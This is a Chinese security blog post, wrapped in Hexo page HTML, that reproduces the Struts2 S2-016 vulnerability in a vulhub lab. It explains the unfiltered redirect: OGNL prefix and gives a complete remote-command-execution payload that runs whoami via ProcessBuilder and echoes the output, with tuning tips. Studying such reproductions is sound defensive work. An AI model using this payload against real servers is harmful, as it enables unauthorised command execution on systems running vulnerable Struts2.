@@ -1,0 +1,181 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>【研究】Struts2漏洞之S2-016漏洞环境和POC | Zeo's Security Lab</title><meta name="author" content="Zeo"><meta name="copyright" content="Zeo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="【研究】Struts2漏洞之S2-016漏洞环境和POC  1.环境 2.原理 3.影响版本 4.利用过程 POC POC注意    1.环境环境https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;blob&#x2F;master&#x2F;README.zh-cn.md这个搭环境很方便快捷，具体可以看说明，很简单 2.原理 在struts2中，DefaultActionMapper类支持以”act">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【研究】Struts2漏洞之S2-016漏洞环境和POC">
+<meta property="og:url" content="https://godzeo.github.io/2019/07/02/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-016%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC/index.html">
+<meta property="og:site_name" content="Zeo&#39;s Security Lab">
+<meta property="og:description" content="【研究】Struts2漏洞之S2-016漏洞环境和POC  1.环境 2.原理 3.影响版本 4.利用过程 POC POC注意    1.环境环境https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;blob&#x2F;master&#x2F;README.zh-cn.md这个搭环境很方便快捷，具体可以看说明，很简单 2.原理 在struts2中，DefaultActionMapper类支持以”act">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231225569.webp">
+<meta property="article:published_time" content="2019-07-02T08:28:35.000Z">
+<meta property="article:modified_time" content="2022-10-12T16:32:06.974Z">
+<meta property="article:author" content="Zeo">
+<meta property="article:tag" content="WEB安全">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="二进制">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231225569.webp"><link rel="shortcut icon" href="/img/WX20211124-162855.png"><link rel="canonical" href="https://godzeo.github.io/2019/07/02/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-016%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '【研究】Struts2漏洞之S2-016漏洞环境和POC',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-10-13 00:32:06'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Zeo's Security Lab" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231013354.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">134</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">43</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231225569.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Zeo's Security Lab</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">【研究】Struts2漏洞之S2-016漏洞环境和POC</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-07-02T08:28:35.000Z" title="发表于 2019-07-02 16:28:35">2019-07-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-10-12T16:32:06.974Z" title="更新于 2022-10-13 00:32:06">2022-10-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WEB-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">WEB 漏洞复现和分析</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="【研究】Struts2漏洞之S2-016漏洞环境和POC"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><span id="more"></span>
+
+<h3 id="【研究】Struts2漏洞之S2-016漏洞环境和POC"><a href="#【研究】Struts2漏洞之S2-016漏洞环境和POC" class="headerlink" title="【研究】Struts2漏洞之S2-016漏洞环境和POC"></a>【研究】Struts2漏洞之S2-016漏洞环境和POC</h3><ul>
+<li><ul>
+<li><a href="#1_2">1.环境</a></li>
+<li><a href="#2_7">2.原理</a></li>
+<li><a href="#3_18">3.影响版本</a></li>
+<li><a href="#4_21">4.利用过程</a></li>
+<li><a href="#POC_24">POC</a></li>
+<li><a href="#POC_49">POC注意</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p>
+<h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><blockquote>
+<p>在struts2中，DefaultActionMapper类支持以”action:”、“redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。</p>
+</blockquote>
+<p>所以，访问<code>http://your-ip:8080/index.action?redirect:OGNL表达式</code>即可执行OGNL表达式。</p>
+<h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>Struts 2.0.0 - Struts 2.3.15</p>
+<h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>环境打开<br><img src="https://img-blog.csdnimg.cn/20190702160552445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>此漏洞用的是get传输即可实现，直接加就好</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redirect:$&#123;%23a%<span class="number">3d</span>(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&#x27;cmd.exe&#x27;</span>, <span class="string">&#x27;/c&#x27;</span>,<span class="string">&#x27;whoami&#x27;</span>&#125;&#125;)).start(),%23b%<span class="number">3d</span>%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%<span class="number">23d</span>%3dnew java.io.BufferedReader(%23c),%23e%3dnew <span class="type">char</span>[<span class="number">50000</span>],%<span class="number">23d</span>.read(%23e),%23matt%<span class="number">3d</span>%23context.get(<span class="string">&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;</span>),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/2019070216140213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载文件，打开看命令<br><img src="https://img-blog.csdnimg.cn/20190702161305961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/struts2-showcase-2.1.6/showcase.action?redirect:$&#123;%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&#x27;cmd.exe&#x27;, &#x27;/c&#x27;,&#x27;whoami&#x27;&#125;&#125;)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>下载打开文件<br><img src="https://img-blog.csdnimg.cn/20190702161717489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="POC注意"><a href="#POC注意" class="headerlink" title="POC注意"></a>POC注意</h2><p>这里发现POC是循环一样的数据 是这两句话 #d.read(#e),#matt.getWriter().println(#e)<br>多写几遍就是手动循环几遍</p>
+<p>还有这句话 #e&#x3D;new char[50000],#d.read(#e)<br>e的大小也关乎显示内容的长短，如果发现回显显示不全，可调整大一些</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://godzeo.github.io">Zeo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://godzeo.github.io/2019/07/02/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-016%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC/">https://godzeo.github.io/2019/07/02/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-016%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://godzeo.github.io" target="_blank">Zeo's Security Lab</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231225569.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2019/07/03/%E8%87%B4%E8%BF%9COA-A8%E7%B3%BB%E7%BB%9F%E7%9A%840day%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AE%9E%E6%88%98/"><img class="prev-cover" src="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231225559.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">致远OA-A8系统的0day远程命令执行的实战</div></div></a></div><div class="next-post pull-right"><a href="/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/"><img class="next-cover" src="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231217732.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231013354.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Zeo</div><div class="author-info__description">专注于安全,分享生活,分享知识</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">134</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">43</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/godzeo"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/godzeo" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:zzzhhhaaaiiii@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Weclome my blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-016%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC"><span class="toc-number">1.</span> <span class="toc-text">【研究】Struts2漏洞之S2-016漏洞环境和POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%8E%AF%E5%A2%83"><span class="toc-number"></span> <span class="toc-text">1.环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%8E%9F%E7%90%86"><span class="toc-number"></span> <span class="toc-text">2.原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number"></span> <span class="toc-text">3.影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-number"></span> <span class="toc-text">4.利用过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number"></span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC%E6%B3%A8%E6%84%8F"><span class="toc-number"></span> <span class="toc-text">POC注意</span></a></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/05/10/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%20ClassLoader%E5%BA%94%E7%94%A8/" title="Java代码审计： ClassLoader应用"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231225569.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java代码审计： ClassLoader应用"/></a><div class="content"><a class="title" href="/2022/05/10/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%20ClassLoader%E5%BA%94%E7%94%A8/" title="Java代码审计： ClassLoader应用">Java代码审计： ClassLoader应用</a><time datetime="2022-05-10T08:21:21.000Z" title="发表于 2022-05-10 16:21:21">2022-05-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/04/22/CodeQL%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/" title="CodeQL基础语法"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231217732.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CodeQL基础语法"/></a><div class="content"><a class="title" href="/2022/04/22/CodeQL%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/" title="CodeQL基础语法">CodeQL基础语法</a><time datetime="2022-04-22T04:01:39.000Z" title="发表于 2022-04-22 12:01:39">2022-04-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/04/07/Spring%20Rce%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90CVE-2022-22965/" title="Spring Rce 漏洞分析CVE-2022-22965"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231225559.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Spring Rce 漏洞分析CVE-2022-22965"/></a><div class="content"><a class="title" href="/2022/04/07/Spring%20Rce%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90CVE-2022-22965/" title="Spring Rce 漏洞分析CVE-2022-22965">Spring Rce 漏洞分析CVE-2022-22965</a><time datetime="2022-04-07T15:20:11.000Z" title="发表于 2022-04-07 23:20:11">2022-04-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/27/%E8%BD%AC%E8%BD%BD%EF%BC%9AGitee%20%E5%9B%BE%E5%BA%8A%20%E5%A4%96%E9%93%BE%E9%97%AE%E9%A2%98%20%E5%A4%84%E7%90%86/" title="转载：Gitee 图床 外链问题 处理"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231217732.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="转载：Gitee 图床 外链问题 处理"/></a><div class="content"><a class="title" href="/2022/03/27/%E8%BD%AC%E8%BD%BD%EF%BC%9AGitee%20%E5%9B%BE%E5%BA%8A%20%E5%A4%96%E9%93%BE%E9%97%AE%E9%A2%98%20%E5%A4%84%E7%90%86/" title="转载：Gitee 图床 外链问题 处理">转载：Gitee 图床 外链问题 处理</a><time datetime="2022-03-27T10:27:24.000Z" title="发表于 2022-03-27 18:27:24">2022-03-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/14/Codeql%20%E7%8E%AF%E5%A2%83%E6%89%8B%E6%A8%A1%E6%89%8B%E6%90%AD%E5%BB%BA%E5%92%8C%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" title="Codeql 环境手模手搭建和简单使用"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231217732.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Codeql 环境手模手搭建和简单使用"/></a><div class="content"><a class="title" href="/2022/03/14/Codeql%20%E7%8E%AF%E5%A2%83%E6%89%8B%E6%A8%A1%E6%89%8B%E6%90%AD%E5%BB%BA%E5%92%8C%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" title="Codeql 环境手模手搭建和简单使用">Codeql 环境手模手搭建和简单使用</a><time datetime="2022-03-14T04:26:04.000Z" title="发表于 2022-03-14 12:26:04">2022-03-14</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2022 By Zeo</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
